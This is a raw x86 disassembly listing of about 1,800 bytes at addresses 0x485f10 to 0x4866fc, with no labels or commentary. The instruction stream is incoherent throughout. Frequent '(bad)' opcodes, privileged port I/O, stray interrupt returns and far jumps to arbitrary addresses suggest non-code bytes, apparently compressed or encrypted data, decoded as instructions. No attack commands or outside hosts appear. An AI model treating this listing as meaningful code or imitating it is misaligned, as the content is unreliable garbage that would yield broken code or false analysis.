  485f10:	shufps xmm6,XMMWORD PTR [eax+0x11],0x40
  485f15:	inc    ebp
  485f16:	cld    
  485f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485f18:	dec    esi
  485f19:	mov    edx,ebp
  485f1b:	mov    bh,0x9d
  485f1d:	loopne 0x485ed5
  485f1f:	push   es
  485f20:	es sbb al,0xe4
  485f23:	inc    edx
  485f24:	push   edi
  485f25:	inc    ebp
  485f26:	mov    ah,0x4f
  485f28:	push   0xce4b7060
  485f2d:	into   
  485f2e:	pop    ecx
  485f2f:	les    edi,FWORD PTR [ecx-0x50]
  485f32:	inc    eax
  485f33:	sub    DWORD PTR [ebp+0x24],ebx
  485f36:	xchg   edx,eax
  485f37:	das    
  485f38:	add    al,ah
  485f3a:	xchg   esi,eax
  485f3b:	add    BYTE PTR [esi],al
  485f3d:	sbb    cl,BYTE PTR [ebx]
  485f3f:	adc    al,0x58
  485f41:	or     dl,bh
  485f43:	pop    esi
  485f44:	aaa    
  485f45:	inc    edi
  485f46:	add    al,0x58
  485f48:	in     al,dx
  485f49:	cmp    DWORD PTR [edi],0xc0c2d998
  485f4f:	leave  
  485f50:	and    DWORD PTR [edx-0x3a8b617],edx
  485f56:	mov    ds:0xa1085721,eax
  485f5b:	cld    
  485f5c:	outs   dx,DWORD PTR ds:[esi]
  485f5d:	mov    WORD PTR [edx-0x26e47f34],cs
  485f63:	iret   
  485f64:	ret    0x7713
  485f67:	aam    0xd3
  485f69:	test   DWORD PTR [ebx],eax
  485f6b:	inc    eax
  485f6c:	fsubr  QWORD PTR [edx+0x31b76d7b]
  485f72:	xor    DWORD PTR es:[edi],edi
  485f75:	mov    eax,DWORD PTR [eax]
  485f77:	inc    ebx
  485f78:	pop    esi
  485f79:	in     al,0x30
  485f7b:	push   esi
  485f7c:	dec    edi
  485f7d:	shl    BYTE PTR [ebx-0xb7e5ebc],0xa4
  485f84:	scas   eax,DWORD PTR es:[edi]
  485f85:	and    al,0x64
  485f87:	sub    eax,0x51d00a84
  485f8c:	in     al,0xba
  485f8e:	and    eax,0xd2a6b484
  485f93:	xchg   edi,esi
  485f95:	es ins DWORD PTR es:[edi],dx
  485f97:	add    eax,0x1f27da41
  485f9c:	daa    
  485f9d:	aas    
  485f9e:	sbb    eax,0xe842a330
  485fa3:	inc    ebp
  485fa4:	nop
  485fa5:	(bad)  
  485fa6:	dec    esi
  485fa7:	and    al,0xa2
  485fa9:	inc    edi
  485faa:	jg     0x485fb2
  485fac:	popf   
  485fad:	cld    
  485fae:	inc    edx
  485faf:	jge    0x485fa9
  485fb1:	mov    eax,edi
  485fb3:	daa    
  485fb4:	push   0x28
  485fb6:	add    BYTE PTR [eax*2-0x3badde6e],dh
  485fbd:	repnz xchg ebx,eax
  485fbf:	sub    DWORD PTR [ebp+edx*4-0x3d],esp
  485fc3:	dec    esi
  485fc4:	add    al,0x8b
  485fc6:	mov    DWORD PTR [eax-0x144bbdca],0xb4c2f336
  485fd0:	adc    eax,edx
  485fd2:	mov    edx,0xae25752a
  485fd7:	and    ebp,eax
  485fd9:	(bad)  
  485fda:	adc    BYTE PTR [ecx],bl
  485fdc:	push   eax
  485fdd:	mov    al,ds:0x40862504
  485fe2:	(bad)  
  485fe3:	add    al,0xb1
  485fe5:	jo     0x485fc4
  485fe7:	test   eax,0xc7223480
  485fec:	adc    al,0x59
  485fee:	pop    edi
  485fef:	les    ecx,FWORD PTR [edx-0x70]
  485ff2:	mov    edi,0x2b0253a5
  485ff7:	add    BYTE PTR [edi],dl
  485ff9:	mov    esi,0x490f7410
  485ffe:	bound  eax,QWORD PTR [ebp+0x56]
  486001:	mov    ds:0x8faaa61,eax
  486006:	addr16 (bad) 
  486008:	arpl   dx,dx
  48600a:	mov    bl,0x1d
  48600c:	add    dh,BYTE PTR [ebp+0x10]
  48600f:	push   edi
  486010:	pop    ebx
  486011:	push   eax
  486012:	jl     0x486043
  486014:	sbb    esp,ebx
  486016:	xchg   edi,eax
  486017:	add    al,BYTE PTR [ebx+0x1]
  48601a:	seto   BYTE PTR [eax-0x7c]
  48601e:	adc    bh,al
  486020:	adc    cl,ch
  486022:	rcl    BYTE PTR [ebp+0x48],1
  486025:	inc    eax
  486026:	or     dl,BYTE PTR [edx+eiz*2]
  486029:	(bad)  
  48602a:	(bad)  
  48602b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48602c:	test   eax,0xe66463b6
  486031:	push   ebp
  486032:	jge    0x4860ad
  486034:	addr16 xchg esi,eax
  486036:	icebp  
  486037:	ins    BYTE PTR es:[edi],dx
  486038:	jne    0x486051
  48603a:	push   eax
  48603b:	push   edx
  48603c:	sbb    DWORD PTR [eax],eax
  48603e:	(bad)  
  48603f:	cmp    BYTE PTR cs:[ebp+0x15],dh
  486043:	shl    BYTE PTR [ebp-0x11],0x92
  486047:	mov    cl,0xd8
  486049:	daa    
  48604a:	out    dx,eax
  48604b:	mov    eax,ds:0x8872d644
  486050:	lea    ebx,[edx+0x3f]
  486053:	dec    eax
  486054:	pop    edx
  486055:	loopne 0x4860d6
  486057:	or     dl,BYTE PTR [eax+edx*1+0x1c]
  48605b:	inc    esi
  48605c:	adc    eax,0x8d144e8d
  486061:	push   esi
  486062:	adc    BYTE PTR [esi-0x14faa7c3],al
  486068:	push   ds
  486069:	or     DWORD PTR [esi+0x2c],0xffffffd0
  48606d:	add    DWORD PTR [esi],ebp
  48606f:	fcom   QWORD PTR [ecx-0x6b]
  486072:	call   0xc30f:0x15305b68
  486079:	adc    eax,0x48015443
  48607e:	add    BYTE PTR [ecx-0x6b],ch
  486081:	add    ch,0x6d
  486084:	and    ah,BYTE PTR [edi+0x98a0459]
  48608a:	repz pop esi
  48608c:	mov    edi,0x52a6833b
  486091:	and    esi,DWORD PTR [esi-0x6d9929cc]
  486097:	add    BYTE PTR [ebp-0x131a792],al
  48609d:	and    DWORD PTR [ecx-0x26],esi
  4860a0:	cmp    edx,DWORD PTR [ecx-0x41d1fcee]
  4860a6:	pop    ebx
  4860a7:	jne    0x4860aa
  4860a9:	adc    ebx,edi
  4860ab:	cmp    al,0x78
  4860ad:	inc    esp
  4860ae:	push   0xc5208e4d
  4860b3:	adc    esp,ebx
  4860b5:	hlt    
  4860b6:	mov    ebx,DWORD PTR [eax]
  4860b8:	xchg   edx,eax
  4860b9:	pop    esp
  4860ba:	xor    eax,0xce960c85
  4860bf:	inc    esi
  4860c0:	or     BYTE PTR [edi-0x56],al
  4860c3:	xchg   BYTE PTR [edi-0x65bf9a02],bh
  4860c9:	sar    BYTE PTR [eax+0x78],cl
  4860cc:	sub    BYTE PTR [ebx+0x7b],al
  4860cf:	xor    DWORD PTR [edx],ebp
  4860d1:	or     al,0x7c
  4860d3:	je     0x486131
  4860d5:	movsx  edx,di
  4860d8:	test   eax,0xdff1548e
  4860dd:	sbb    eax,0x816647eb
  4860e2:	jle    0x4860ee
  4860e4:	add    DWORD PTR [edx],ecx
  4860e6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4860e8:	add    esi,DWORD PTR [ecx+0x29dbb07d]
  4860ee:	sbb    esp,edi
  4860f0:	(bad)  
  4860f1:	xlat   BYTE PTR ds:[ebx]
  4860f2:	call   0xa76113f8
  4860f7:	loopne 0x4860fd
  4860f9:	ret    0x1adb
  4860fc:	in     al,0xe
  4860fe:	xor    eax,0x62a8f094
  486103:	or     bh,al
  486105:	sbb    BYTE PTR [ebx-0x51],dl
  486108:	daa    
  486109:	loop   0x48609c
  48610b:	inc    edi
  48610c:	sti    
  48610d:	dec    ebx
  48610e:	loopne 0x48616e
  486110:	daa    
  486111:	dec    esp
  486112:	int3   
  486113:	mov    BYTE PTR [esi+0x6d8192f9],0x47
  48611a:	(bad)  
  48611b:	xor    eax,0x893f0027
  486120:	inc    ebp
  486121:	inc    esi
  486122:	pop    es
  486123:	lahf   
  486124:	ret    
  486125:	adc    eax,0x5c931a0a
  48612a:	pop    ecx
  48612b:	repz or edi,edi
  48612e:	mov    ds:0x88bb83c3,al
  486133:	cdq    
  486134:	add    ecx,0x49
  486137:	cmp    BYTE PTR [edx+ebx*8],cl
  48613a:	pop    es
  48613b:	cmp    bl,BYTE PTR [eax-0x74031b3c]
  486141:	adc    DWORD PTR [edx-0x62],esp
  486144:	xchg   edi,eax
  486145:	test   al,0xd3
  486147:	cmp    edx,edx
  486149:	mov    al,0x19
  48614b:	sub    BYTE PTR [ebp+0x2e],cl
  48614e:	dec    ebp
  48614f:	das    
  486150:	ss mov cl,0x70
  486153:	cmp    al,0xc0
  486155:	test   BYTE PTR [edx],dh
  486157:	xchg   esi,eax
  486158:	mov    dh,0xdc
  48615a:	ror    DWORD PTR [edi-0x6d],0x85
  48615e:	ret    
  48615f:	mov    ds:0x7612f60e,al
  486164:	jl     0x48617b
  486166:	cmp    edi,edx
  486168:	add    DWORD PTR [ebx],eax
  48616a:	jmp    0x4861c0
  48616c:	ja     0x4861d8
  48616e:	add    DWORD PTR [ecx+0x44],ebp
  486171:	(bad)  
  486172:	out    0x5e,eax
  486174:	and    eax,0x1493938a
  486179:	mov    al,0xec
  48617b:	lea    esp,[eax]
  48617d:	rol    DWORD PTR [edx],0x39
  486180:	retf   0xd75c
  486183:	repnz test al,0x91
  486186:	pushf  
  486187:	rcr    DWORD PTR [edx+0x5d],cl
  48618a:	jle    0x486114
  48618c:	retf   
  48618d:	push   esp
  48618e:	test   al,0xa0
  486190:	xor    eax,ebx
  486192:	add    eax,0xb8810f07
  486197:	popf   
  486198:	inc    eax
  486199:	cmp    al,0x50
  48619b:	and    ebp,DWORD PTR [ecx-0x7b3f63e6]
  4861a1:	xor    BYTE PTR ds:0xd02d01b2,dh
  4861a7:	nop
  4861a8:	dec    eax
  4861a9:	leave  
  4861aa:	inc    ebx
  4861ab:	popa   
  4861ac:	pop    ebp
  4861ad:	push   es
  4861ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4861af:	call   0xd07da948
  4861b4:	and    eax,0xb433c968
  4861b9:	sbb    al,bh
  4861bb:	into   
  4861bc:	ret    0xd0d7
  4861bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4861c0:	jb     0x486186
  4861c2:	ror    BYTE PTR [esi],0xca
  4861c5:	inc    esp
  4861c6:	xchg   edx,eax
  4861c7:	retf   0xcc25
  4861ca:	enter  0x2cf1,0x12
  4861ce:	arpl   WORD PTR [ecx],di
  4861d0:	lds    edx,FWORD PTR ds:0xbc1b0baa
  4861d6:	xor    al,0x50
  4861d8:	mov    ds:0x80486138,al
  4861dd:	push   0xffffffe8
  4861df:	jl     0x486200
  4861e1:	(bad)  
  4861e2:	mov    dl,0x45
  4861e4:	aad    0xd0
  4861e6:	push   cs
  4861e7:	fwait
  4861e8:	mov    ch,0xe4
  4861ea:	mov    ah,0xb
  4861ec:	fidiv  WORD PTR [edx+0x29]
  4861ef:	mov    dl,0x13
  4861f1:	xchg   ebx,eax
  4861f2:	mov    edx,0xe5379746
  4861f7:	mov    edx,0x2e26f92f
  4861fc:	call   0x68054b5c
  486201:	mov    eax,0xd49f5122
  486206:	pop    edi
  486207:	dec    edi
  486208:	imul   ebp,ecx,0xd2852c21
  48620e:	test   DWORD PTR [esi-0x75bdb610],esp
  486214:	lds    esi,FWORD PTR [edi]
  486216:	push   0xffffffe8
  486218:	mov    ebx,0x1fc3373e
  48621d:	xor    DWORD PTR [ecx-0x78ff0f8c],0x1f03f83
  486227:	mov    edi,0x19f2bbf1
  48622c:	push   esi
  48622d:	repz iret 
  48622f:	or     al,0x3
  486231:	out    0x6b,eax
  486233:	push   ecx
  486234:	hlt    
  486235:	jmp    0x1cc9232a
  48623a:	in     al,dx
  48623b:	repz adc edx,DWORD PTR [edi-0x40]
  48623f:	cmp    DWORD PTR [ecx+ecx*2+0x18],esi
  486243:	dec    ebx
  486244:	arpl   WORD PTR [ebx+0x429857e],cx
  48624a:	outs   dx,BYTE PTR ds:[esi]
  48624b:	jg     0x486282
  48624d:	shl    BYTE PTR ds:0x94917810,1
  486253:	jne    0x48625c
  486255:	popa   
  486256:	loopne 0x4862a5
  486258:	hlt    
  486259:	cmp    edx,DWORD PTR [eax+0x468ba63e]
  48625f:	mov    edx,0xe0b35f95
  486264:	jb     0x486287
  486266:	cld    
  486267:	xor    eax,0xc65e74f6
  48626c:	add    ch,bl
  48626e:	or     ah,BYTE PTR [edi+ecx*1+0x44758f65]
  486275:	mul    DWORD PTR [esp+esi*4+0x3af87dbc]
  48627c:	addr16 push esi
  48627e:	pop    ds
  48627f:	sub    ah,0xeb
  486282:	xchg   ecx,eax
  486283:	fsubr  DWORD PTR [edx+0xa]
  486286:	add    ch,BYTE PTR [ebx+0x36]
  486289:	popa   
  48628a:	cs pop es
  48628c:	test   al,0xd2
  48628e:	sbb    DWORD PTR [ebx+ecx*8-0x5074ba7d],ebx
  486295:	aam    0xd0
  486297:	xchg   ebp,eax
  486298:	sbb    esi,DWORD PTR [ecx-0x3a5498b8]
  48629e:	dec    edx
  48629f:	dec    ecx
  4862a0:	jo     0x4862dc
  4862a2:	dec    esi
  4862a3:	clc    
  4862a4:	inc    edi
  4862a5:	es jne 0x4862c3
  4862a8:	push   0x1ae7dfa9
  4862ad:	xlat   BYTE PTR ds:[ebx]
  4862ae:	push   esp
  4862af:	dec    ebx
  4862b0:	std    
  4862b1:	mov    eax,ds:0xdf4f012b
  4862b6:	out    0xe9,al
  4862b8:	xchg   BYTE PTR [ebp+0x7d67cf91],dh
  4862be:	nop
  4862bf:	call   0x51c51e95
  4862c4:	xor    BYTE PTR [edx-0x35],ah
  4862c7:	daa    
  4862c8:	sub    al,0xcd
  4862ca:	or     BYTE PTR [eax-0x348e58f0],ch
  4862d0:	xchg   edi,eax
  4862d1:	or     DWORD PTR [ebx+ebx*1],edi
  4862d4:	mov    cl,BYTE PTR [eax+0x6a]
  4862d7:	and    al,0x17
  4862d9:	mov    edx,0x8c7705a4
  4862de:	loope  0x4862b2
  4862e0:	or     eax,0x3b9e1320
  4862e5:	inc    edx
  4862e6:	xchg   ebx,eax
  4862e7:	jne    0x486306
  4862e9:	dec    ecx
  4862ea:	sbb    eax,0x4a028183
  4862ef:	ds inc ebx
  4862f1:	add    DWORD PTR [edx],0xffffffd2
  4862f4:	dec    eax
  4862f5:	retf   0xc727
  4862f8:	out    dx,al
  4862f9:	and    BYTE PTR [ebx],bh
  4862fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4862fc:	adc    edi,ebx
  4862fe:	in     al,0x60
  486300:	cmp    bl,BYTE PTR [edi+0x107eb0ed]
  486306:	out    dx,eax
  486307:	je     0x486379
  486309:	mov    BYTE PTR [edi],cl
  48630b:	cmp    BYTE PTR [ebp+0x64],dh
  48630e:	and    BYTE PTR [eax],0x80
  486311:	outs   dx,DWORD PTR es:[esi]
  486313:	fsubr  DWORD PTR [esi+ecx*1]
  486316:	add    eax,0x8750e824
  48631b:	xchg   ebp,eax
  48631c:	sub    eax,0xfc6142b0
  486321:	sbb    DWORD PTR [ebp-0xf4e8e79],ecx
  486327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486328:	adc    eax,0x8978bf6c
  48632d:	sbb    DWORD PTR [ecx],ecx
  48632f:	shr    BYTE PTR [edx+0x5b],1
  486332:	dec    edi
  486333:	push   eax
  486334:	ins    BYTE PTR es:[edi],dx
  486335:	dec    esp
  486336:	pop    ebx
  486337:	lea    esi,[ecx+0x4ac4716c]
  48633d:	leave  
  48633e:	xchg   ebx,eax
  48633f:	inc    ebx
  486340:	iret   
  486341:	jmp    0x4863a3
  486343:	dec    edx
  486344:	lods   al,BYTE PTR ds:[esi]
  486345:	arpl   WORD PTR [ecx+eiz*1-0x2b1741ab],sp
  48634c:	loope  0x486374
  48634e:	test   DWORD PTR [edi+0x2c],eax
  486351:	enter  0xfdd,0x4a
  486355:	sub    eax,DWORD PTR [ebx]
  486357:	mov    edx,0x3e93d4f5
  48635c:	test   al,0xca
  48635e:	call   0x61aeff64
  486363:	sbb    eax,0x61b62763
  486368:	js     0x48637a
  48636a:	sub    eax,0x3804779b
  48636f:	loopne 0x4862f3
  486371:	sbb    BYTE PTR ds:0xc02b2e25,al
  486377:	mov    bh,0x49
  486379:	mov    ds,edi
  48637b:	xor    BYTE PTR [edi+ebx*2],ah
  48637e:	push   eax
  48637f:	pop    eax
  486380:	push   edx
  486381:	push   cs
  486382:	mov    ds:0x8a8c05dd,al
  486387:	dec    eax
  486388:	push   esp
  486389:	or     bl,BYTE PTR [eax]
  48638b:	cmp    BYTE PTR [ebx],cl
  48638d:	sbb    BYTE PTR [esi+0xa4f1080],dl
  486393:	or     esp,esp
  486395:	xor    BYTE PTR [ebx-0x43],dl
  486398:	popa   
  486399:	loope  0x486416
  48639b:	test   BYTE PTR [esi-0x31],bh
  48639e:	add    eax,0xc7a2c0c2
  4863a3:	inc    eax
  4863a4:	sbb    BYTE PTR [eax+0x2d],bl
  4863a7:	sbb    BYTE PTR [ecx],ch
  4863a9:	xlat   BYTE PTR ds:[ebx]
  4863aa:	inc    edx
  4863ab:	ret    
  4863ac:	xchg   BYTE PTR [ecx+0x61],bh
  4863af:	sti    
  4863b0:	pop    ss
  4863b1:	cmc    
  4863b2:	push   cs
  4863b3:	adc    DWORD PTR [eax-0x7f],edi
  4863b6:	sbb    edx,DWORD PTR [esi-0x38]
  4863b9:	sbb    DWORD PTR [eax],ebp
  4863bb:	lock ins BYTE PTR es:[edi],dx
  4863bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4863be:	dec    edx
  4863bf:	(bad)  
  4863c0:	and    ecx,DWORD PTR [edx]
  4863c2:	sub    BYTE PTR [edx+edx*4+0x3405bae9],bl
  4863c9:	mov    al,0x80
  4863cb:	dec    esi
  4863cc:	lahf   
  4863cd:	push   edi
  4863ce:	dec    edx
  4863cf:	add    al,0xd9
  4863d1:	inc    edx
  4863d2:	inc    esp
  4863d3:	xlat   BYTE PTR ds:[ebx]
  4863d4:	jb     0x486438
  4863d6:	push   edx
  4863d7:	nop
  4863d8:	(bad)  
  4863d9:	and    cl,0x8d
  4863dc:	dec    eax
  4863dd:	inc    esp
  4863de:	adc    ch,BYTE PTR [ecx-0x7f53db34]
  4863e4:	fwait
  4863e5:	or     DWORD PTR [ebx+eiz*4+0x2e],0x5d
  4863ea:	jo     0x48641c
  4863ec:	loopne 0x486433
  4863ee:	ja     0x4863da
  4863f0:	out    dx,eax
  4863f1:	add    esp,DWORD PTR [ebx-0x6a]
  4863f4:	lock sbb bl,ah
  4863f7:	subps  xmm1,XMMWORD PTR [ebx]
  4863fa:	jmp    0x5814423
  4863ff:	dec    edi
  486400:	inc    ebx
  486401:	inc    ecx
  486402:	(bad)  [edx+0x55dca718]
  486408:	mov    cl,0x98
  48640a:	adc    bl,BYTE PTR [esi+0x32175ad8]
  486410:	or     ebx,DWORD PTR [esi+0x26]
  486413:	or     eax,0x16ede9d1
  486418:	push   es
  486419:	inc    ebx
  48641a:	sbb    bh,BYTE PTR [ebx]
  48641c:	cmc    
  48641d:	push   0x22dbd80
  486422:	inc    edx
  486423:	js     0x48648a
  486425:	jl     0x4863b0
  486427:	ins    DWORD PTR es:[edi],dx
  486428:	push   edx
  486429:	pop    esi
  48642a:	sbb    ebp,DWORD PTR [ecx+0x1c]
  48642d:	push   0x2b
  48642f:	jne    0x486471
  486431:	and    al,0x8a
  486433:	xchg   esp,eax
  486434:	add    BYTE PTR [edx+0x18],bh
  486437:	sbb    dl,dh
  486439:	and    BYTE PTR [eax+ecx*4-0x43714356],bl
  486440:	dec    ebx
  486441:	(bad)  
  486442:	xchg   ecx,eax
  486443:	(bad)  
  486444:	fadd   DWORD PTR [ecx-0x16e6be2c]
  48644a:	(bad)  
  48644b:	pop    ebp
  48644c:	aas    
  48644d:	sbb    BYTE PTR ds:0x579142c2,dl
  486453:	jg     0x486496
  486455:	push   cs
  486456:	fwait
  486457:	adc    al,0x21
  486459:	jne    0x486403
  48645b:	adc    BYTE PTR [eax+0x5767015d],cl
  486461:	nop
  486462:	retf   
  486463:	xchg   esp,eax
  486464:	pop    esp
  486465:	iret   
  486466:	jmp    0xa9c9:0x1720e8ec
  48646d:	push   ebx
  48646e:	cwde   
  48646f:	mov    ebx,0x1792c67b
  486474:	push   ebx
  486475:	cwde   
  486476:	fistp  QWORD PTR [edi]
  486478:	inc    eax
  486479:	mov    ch,BYTE PTR [ecx+edx*2+0x440e256]
  486480:	dec    ebx
  486481:	in     eax,0xe4
  486483:	loopne 0x486414
  486485:	aam    0xd4
  486487:	and    edi,0x54
  48648a:	pusha  
  48648b:	sub    bh,BYTE PTR [ecx+0x22]
  48648e:	cmp    ch,BYTE PTR [esi-0x5d]
  486491:	shl    DWORD PTR [ebx],0x2e
  486494:	aam    0x7d
  486496:	mov    edx,0x2ded04f
  48649b:	adc    BYTE PTR [eax+0xf248030],ah
  4864a1:	add    BYTE PTR [ebp-0x73],0x47
  4864a5:	push   esp
  4864a6:	pusha  
  4864a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4864a8:	mov    al,0x62
  4864aa:	pusha  
  4864ab:	pop    ds
  4864ac:	inc    edx
  4864ad:	sub    al,0x24
  4864af:	xchg   BYTE PTR [eax],ch
  4864b1:	jae    0x486492
  4864b3:	sub    al,0x53
  4864b5:	or     eax,0x74331edc
  4864ba:	push   ds
  4864bb:	add    al,bl
  4864bd:	inc    ecx
  4864be:	xor    edx,DWORD PTR [ebp-0x6b8e44a5]
  4864c4:	xor    BYTE PTR [ecx+0x7401c050],0x7e
  4864cb:	adc    bh,BYTE PTR [ebx-0x1edcdc5b]
  4864d1:	dec    eax
  4864d2:	ret    0x175
  4864d5:	fist   WORD PTR [edx]
  4864d7:	dec    ecx
  4864d8:	add    al,0xba
  4864da:	adc    al,BYTE PTR [ecx]
  4864dc:	push   ebp
  4864dd:	and    DWORD PTR [ebx],eax
  4864df:	or     ebx,DWORD PTR [esp+eax*4-0xf]
  4864e3:	push   ss
  4864e4:	std    
  4864e5:	dec    ecx
  4864e6:	sbb    BYTE PTR [eax+0x42],bh
  4864e9:	shl    ah,0xd5
  4864ec:	sbb    BYTE PTR [edi-0x47fb82c],bl
  4864f2:	(bad)
  4864f6:	test   BYTE PTR [ebp+0x17],cl
  4864f9:	push   edi
  4864fa:	sbb    eax,0x4c57634d
  4864ff:	and    eax,0x7df135f0
  486504:	inc    ebx
  486505:	mov    ds:0xc55c2801,al
  48650a:	js     0x486514
  48650c:	and    BYTE PTR [edx+edx*2+0x70],dh
  486510:	mov    ds:0x2d13b819,eax
  486515:	bound  eax,QWORD PTR [ebx+0x79e26b]
  48651b:	int    0x30
  48651d:	cmp    BYTE PTR [ecx-0x7ffed0f0],al
  486523:	shl    DWORD PTR [ebx-0x27],0x3b
  486527:	pop    eax
  486528:	inc    esp
  486529:	pusha  
  48652a:	cmp    eax,0x4dc08710
  48652f:	push   ss
  486530:	jbe    0x4864e8
  486532:	pop    ss
  486533:	shl    DWORD PTR [ebx+0x5c8b11bd],0x29
  48653a:	fisttp DWORD PTR ds:0x9c315d55
  486540:	add    DWORD PTR [ebp+esi*2-0x26],ecx
  486544:	stos   DWORD PTR es:[edi],eax
  486545:	inc    eax
  486546:	stos   BYTE PTR es:[edi],al
  486547:	inc    ebx
  486548:	adc    DWORD PTR [edx-0x49],0xffffff87
  48654c:	and    BYTE PTR [edx-0xe],ch
  48654f:	cmp    eax,0xc22c7304
  486554:	out    0x2,al
  486556:	jo     0x48655a
  486558:	fimul  WORD PTR [edx]
  48655a:	sub    al,0x61
  48655c:	aam    0xd6
  48655e:	and    al,0x8d
  486560:	jmp    DWORD PTR [edi+0x23318428]
  486566:	pop    ss
  486567:	cmp    eax,0x641bc90d
  48656c:	xchg   BYTE PTR [eax],dl
  48656e:	es mov al,0x5e
  486571:	cs jle 0x486582
  486574:	lods   al,BYTE PTR ds:[esi]
  486575:	fidiv  WORD PTR [bp+di]
  486578:	mov    BYTE PTR [esi-0x3d297a03],0x33
  48657f:	addr16 jle 0x4865f4
  486582:	mov    al,0xbb
  486584:	nop
  486585:	dec    esi
  486586:	jle    0x48658d
  486588:	xor    bl,ah
  48658a:	add    ah,bl
  48658c:	xchg   esi,eax
  48658d:	sbb    DWORD PTR [edi],0x2bbad78f
  486593:	jmp    0x2e2c:0xefd4088a
  48659a:	loope  0x4865b3
  48659c:	loope  0x48653c
  48659e:	jge    0x4865d1
  4865a0:	sbb    eax,0xc73883a9
  4865a5:	mov    ds:0x227c6abf,al
  4865aa:	test   BYTE PTR [esp],bl
  4865ad:	jne    0x4865cc
  4865af:	popf   
  4865b0:	js     0x48660e
  4865b2:	shr    edi,cl
  4865b4:	jo     0x4865b7
  4865b6:	cmp    eax,0xff42d80a
  4865bb:	jne    0x48659b
  4865bd:	idiv   DWORD PTR [edx-0x41a7eee4]
  4865c3:	cli    
  4865c4:	add    al,0x5a
  4865c6:	rcr    al,0x5b
  4865c9:	sub    BYTE PTR [edi+0xd],dl
  4865cc:	test   bl,al
  4865ce:	jb     0x4865fa
  4865d0:	idiv   BYTE PTR [edi]
  4865d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4865d3:	add    BYTE PTR [ebx],dh
  4865d5:	pusha  
  4865d6:	les    edi,FWORD PTR ds:0xae22617
  4865dc:	pop    edi
  4865dd:	data16 ficom DWORD PTR [edi-0x15745b78]
  4865e4:	xor    esp,ebp
  4865e6:	pop    esi
  4865e7:	outs   dx,DWORD PTR ds:[esi]
  4865e8:	sbb    bh,ah
  4865ea:	imul   BYTE PTR [ebx+eax*2+0x19]
  4865ee:	jle    0x4865d7
  4865f0:	push   0x9a5a0831
  4865f5:	cmp    eax,0x10502fc3
  4865fa:	mov    dh,BYTE PTR [ecx+ebx*2+0x2c682ffc]
  486601:	arpl   di,ax
  486603:	es xchg edi,eax
  486605:	sar    DWORD PTR ds:0xcc817090,0x3e
  48660c:	lds    edi,FWORD PTR [eax]
  48660e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48660f:	cmp    esi,esi
  486611:	loope  0x4865ee
  486613:	pop    ebx
  486614:	sub    bl,0x24
  486617:	dec    ebx
  486618:	cmp    al,0x17
  48661a:	inc    esp
  48661b:	sbb    ch,BYTE PTR [ecx+edi*4]
  48661e:	cmp    al,0x95
  486620:	ret    0x6a89
  486623:	rcl    BYTE PTR [edx],cl
  486625:	xchg   DWORD PTR [ecx+eax*8],ebx
  486628:	xchg   edi,eax
  486629:	add    BYTE PTR [edi],cl
  48662b:	mov    ebx,0x19dc3dc9
  486630:	sbb    esp,eax
  486632:	pop    ds
  486633:	mov    esi,0xc147a681
  486638:	loop   0x486613
  48663a:	icebp  
  48663b:	sbb    DWORD PTR [ecx],edx
  48663d:	add    esi,esp
  48663f:	jg     0x486668
  486641:	popf   
  486642:	cwde   
  486643:	inc    edx
  486644:	stos   BYTE PTR es:[edi],al
  486645:	stos   DWORD PTR es:[edi],eax
  486646:	rcpps  xmm4,XMMWORD PTR [ecx-0x6b4e3baa]
  48664d:	or     ebx,0xc0de0ffa
  486653:	test   ebx,esi
  486655:	xor    eax,0x789bf037
  48665a:	sbb    eax,edx
  48665c:	pop    ss
  48665d:	mov    ah,BYTE PTR [ebx]
  48665f:	jo     0x4865e8
  486661:	xchg   DWORD PTR [ebp-0x4e],ecx
  486664:	adc    al,0x55
  486666:	or     dl,ah
  486668:	sub    BYTE PTR [eax+eax*1-0x4b94adba],cl
  48666f:	jno    0x48664e
  486671:	inc    edi
  486672:	xchg   ebx,eax
  486673:	pop    esp
  486674:	mov    eax,0xb945aec3
  486679:	loopne 0x48664d
  48667b:	gs arpl di,bp
  48667e:	into   
  48667f:	in     eax,0x5
  486681:	pusha  
  486682:	push   ebx
  486683:	xor    al,0x55
  486685:	rcr    DWORD PTR [esi],cl
  486687:	test   DWORD PTR [eax+0x40597953],esp
  48668d:	inc    edi
  48668e:	sbb    BYTE PTR [eax],bh
  486690:	bound  ecx,QWORD PTR [eax]
  486692:	mov    ch,0x82
  486694:	xchg   BYTE PTR [ecx],dh
  486696:	mov    esp,0xa410763b
  48669b:	push   eax
  48669c:	or     DWORD PTR [edi],ebp
  48669e:	dec    edi
  48669f:	xor    BYTE PTR [ecx+0x4c2d616e],bh
  4866a5:	sbb    BYTE PTR [ebx+esi*2+0xe534921],dl
  4866ac:	ret    
  4866ad:	js     0x4866b7
  4866af:	xchg   bl,cl
  4866b1:	sbb    al,dl
  4866b3:	push   es
  4866b4:	dec    DWORD PTR [ecx+0x2a]
  4866b7:	and    al,0x92
  4866b9:	lock xchg ebx,eax
  4866bb:	arpl   WORD PTR [ebx+0xb51b7c4],cx
  4866c1:	sub    DWORD PTR [eax],0x14
  4866c4:	jo     0x486670
  4866c6:	je     0x48665a
  4866c8:	mov    dh,0x73
  4866ca:	mov    fs,WORD PTR [eax]
  4866cc:	pop    ecx
  4866cd:	pop    edx
  4866ce:	outs   dx,DWORD PTR ds:[esi]
  4866cf:	adc    dh,0xf0
  4866d2:	mov    bh,0xf7
  4866d4:	es push 0x37
  4866d7:	xor    edx,DWORD PTR [ecx+0x3a]
  4866da:	cmp    eax,0x80b8011d
  4866df:	jle    0x48672f
  4866e1:	pop    ds
  4866e2:	push   ds
  4866e3:	add    DWORD PTR [ebx+0x28745ec7],ecx
  4866e9:	dec    ebp
  4866ea:	and    al,BYTE PTR [edi-0x7efacf26]
  4866f0:	pop    ss
  4866f1:	pop    ss
  4866f2:	std    
  4866f3:	nop
  4866f4:	add    ah,ch
  4866f6:	push   eax
  4866f7:	push   0xa5117ec3
  4866fc:	retf   0x3001
